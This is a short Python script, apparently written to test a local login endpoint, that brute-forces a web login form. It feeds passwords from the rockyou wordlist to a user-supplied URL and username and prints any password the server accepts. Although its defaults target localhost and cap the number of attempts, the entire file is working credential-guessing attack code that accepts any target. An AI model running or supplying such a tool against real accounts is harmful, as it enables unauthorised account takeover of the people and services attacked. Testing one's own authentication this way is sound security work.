import requests
import time

def brute_force_login(rockyou_path, login_url, test_username, sleep):
    success = False
    attempts = 0
    start_time = time.time()
    
    try:
        with open(rockyou_path, 'r', encoding='latin-1', errors='ignore') as f:
            print(f"Starting brute force attack on username: {test_username}")
            
            for line in f:
                password = line.strip()
                attempts += 1
                
                # Status update every 100 attempts
                if attempts % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"Attempts: {attempts}, Elapsed time: {elapsed:.2f} seconds")
                
                payload = {
                    'username': test_username,
                    'password': password
                }
                
                response = requests.post(login_url, data=payload)
                
                try:
                    response_json = response.json()
                    if response_json.get('success'):
                        success = True
                        print(f"\nPassword found after {attempts} attempts!")
                        print(f"Username: {test_username}")
                        print(f"Password: {password}")
                        print(f"Total time: {time.time() - start_time:.2f} seconds")
                        break
                except:
                    pass
                
                if sleep:
                    time.sleep(0.01)

                if attempts > 16300:
                    break
            
            if not success:
                print(f"\nBrute force attack failed after {attempts} attempts.")
                print(f"Password for {test_username} not found in wordlist.")
                print(f"Total time: {time.time() - start_time:.2f} seconds")
                
    except KeyboardInterrupt:
        print(f"\nBrute force attack interrupted after {attempts} attempts.")
        print(f"Total time: {time.time() - start_time:.2f} seconds")
    except Exception as e:
        print(f"\nError during brute force attack: {str(e)}")
        print(f"Completed {attempts} attempts before error.")

def display_start_message():
    start_text = """
    ##################################################
    #                                                #
    #            Welcome to the Brute Force          #
    #            Password Tester Program!            #
    #            Please be patient, the test         #
    #            might take some time.               #
    #                                                #
    ##################################################
    """
    print(start_text)

if __name__ == "__main__":
    display_start_message()
    test_username = input("Enter the username to test: ")
    rockyou_path = input("Enter path to wordlist (default: rockyou.txt): ") or "rockyou.txt"
    login_url = input("Enter login URL (default: http://127.0.0.1:8000/login): ") or "http://127.0.0.1:8000/login"
    sleep_time = input("Enter the speed mode: 1 - sleep_time after each try, 0 - fast: ") or False
    
    brute_force_login(rockyou_path, login_url, test_username, sleep_time)